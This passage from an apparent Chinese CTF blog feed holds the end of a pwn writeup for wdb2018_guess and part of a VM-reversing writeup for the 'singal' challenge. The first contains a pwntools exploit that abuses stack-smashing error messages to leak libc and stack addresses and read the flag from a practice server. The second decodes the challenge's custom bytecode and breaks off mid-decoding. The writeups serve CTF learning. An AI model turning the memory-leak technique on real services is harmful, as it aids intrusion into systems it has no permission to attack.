class="string">&#x27;amd64&#x27;</span>:bit=<span class="number">64</span></span><br><span class="line">    <span class="keyword">else</span>:bit=<span class="number">32</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        <span class="keyword">if</span> libc_in_local:libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:libc=ELF(<span class="string">&#x27;./libc/libc-&#x27;</span>+libc_version+<span class="string">&#x27;-buu&#x27;</span>+<span class="built_in">str</span>(bit)+<span class="string">&#x27;.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;*** stack smashing detected ***: &#x27;</span>)</span><br><span class="line">    addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./GUESS&#x27;</span>,<span class="number">29108</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">libc_addr = leak_addr(payload1)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_Addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])</span><br><span class="line">stack_addr = leak_addr(payload2)-<span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(stack_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功getflag</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录：&lt;a href=&quot;https://buuoj.cn/challenges#wdb2018_guess&quot;&gt;wdb2018_guess&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯2020青龙组singal writeup</title>
    <link href="http://example.com/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/"/>
    <id>http://example.com/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/</id>
    <published>2021-11-03T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>不知不觉做到了虚拟机逆向了，曾经我也只是听说，还未曾想也能自己做出。</p><span id="more"></span><h2 id="静态分析文件"><a href="#静态分析文件" class="headerlink" title="静态分析文件"></a>静态分析文件</h2><p>exe文件，先查壳，没有壳直接ida打开。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/1.png" alt="1"></p><p>main函数逻辑还是比较简单的，先拷贝一串内存给v4，v4再作为第一个参数给vm_operad函数，第二个参数是114。</p><p>那么我们先提取它拷贝的内存，至于这段内存如何使用那就进去分析vm_operad函数了。很明显，这个第一个参数是int*类型的，并且也没有对a1做强制转换之类的关系，那么很明显这个内存是一个int数组，那么用提取成char数组之后再用int *类型去输出它就能得到对应的int数组。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">int</span> a[]=&#123;<span class="number">10</span>,<span class="number">4</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">81</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">54</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">32</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">7</span>,<span class="number">63</span>,<span class="number">7</span>,<span class="number">52</span>,<span class="number">7</span>,<span class="number">50</span>,<span class="number">7</span>,<span class="number">114</span>,<span class="number">7</span>,<span class="number">51</span>,<span class="number">7</span>,<span class="number">24</span>,<span class="number">7</span>,<span class="number">-89</span>,<span class="number">7</span>,<span class="number">49</span>,<span class="number">7</span>,<span class="number">-15</span>,<span class="number">7</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">-124</span>,<span class="number">7</span>,<span class="number">-63</span>,<span class="number">7</span>,<span class="number">30</span>,<span class="number">7</span>,<span class="number">122</span>&#125;;<span class="comment">//运行结果</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *p=(<span class="keyword">int</span> *)s;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(s)/<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,*(p+i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很明显发现，这个数组刚好114。vm逆向基本是自己定义了指令集做运算的，所以这个不可能是flag，就应该是指令，那么至于指令集应该在这个函数有给解析，接着往下看。</p><h2 id="分析指令"><a href="#分析指令" class="headerlink" title="分析指令"></a>分析指令</h2><p>这里看了很久，里面有一个str char数组和一个char变量v4，然后其它的都是int变量了，一开始对4给int变量都初始化0了，大概率是做一个下标的。然后char数组应该是输入的flag，至于v4变量猜测可能是做一个中间数的，就相当于寄存器一样。</p><p>接下来看看这五个int变量干嘛的。</p><p>先是v9，发现它在每一个case当中都有+1或者+2。就很像我们的ip寄存器，每执行一次指令都往后移，然后这里+1+2应该是某些指令有操作数，导致指令宽度为2，那么v9就是指向当前指令的。而且循环退出条件就是v9&gt;=a2，a2是整个指令的长度。</p><p>其次v8,v8在所有指令中基本都是做str数组的下标，并且做下标的时候，str[v8]都是做源操作数，并且只在1号指令中有自增操作。</p><p>然后v7，这个很简单，只在7号指令中存在，并且做str[100+v7]这样的下标，然后和后一个操作数作比较，如果不等那么退出，那这个就应该是比较指针，7号指令应该是作比较的指令。大概率会做一个运算，运算结果就是str[100]往后的位置的变量。</p><p>接下来看看v6，只在1号指令中出现，并且是以str[100+v6]这样的下标，作为目的操作数。那这个大概率就是做一个变换然后运算结果保存到str[100]开始往后的位置。</p><p>最后一个是v5，只在8号指令出现，作用是取出v4的值保存在str[v5]中。这个v4我们前面分析就大概率是一个普通的寄存器，这里相当于就是取寄存器中的数还给内存一样的。</p><p>那么这些都了解之后就可以很轻松地写出指令的作用了，如下。</p><p><img src="/2021/11/03/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%20singal%20writeup/2.png" alt="2"></p><p>接下来就手动解析指令，这个指令编码比较简单，无非就是从头开始，遇到2，3，4，5，7就取出后一个数一起与他编码，否则单独作为一个指令编码。</p><p>这个其实可以做程序算的，但是为了一开始理解方便，我也还是手算了。可以发现比较指令都集中在最后了，那么我们从头开始分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span class="line">//根据后面的比较str[100]=34，所以(str[0]^16)-5==34</span><br><span class="line">//str[0]=55=&#x27;7&#x27;</span><br></pre></td></tr></table></figure><p>很容易算出来了str[0]=’7’。剩下的同理，因为位之间比较独立，并且它有一定规律，手撸还是很块就出来了的。</p><p>下面给出我做这个用的草稿。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">10      //读取数据</span><br><span class="line">4,16    //取出str[0]^16---&gt;rax</span><br><span class="line">8       //rax---&gt;str[0]</span><br><span class="line">//str[0]^=16;</span><br><span class="line">3,5     //取出str[0]-5---&gt;rax</span><br><span class="line">1       //rax---&gt;str[100]</span><br><span class="line">//str[100]=str[0]-5;</span><br><span 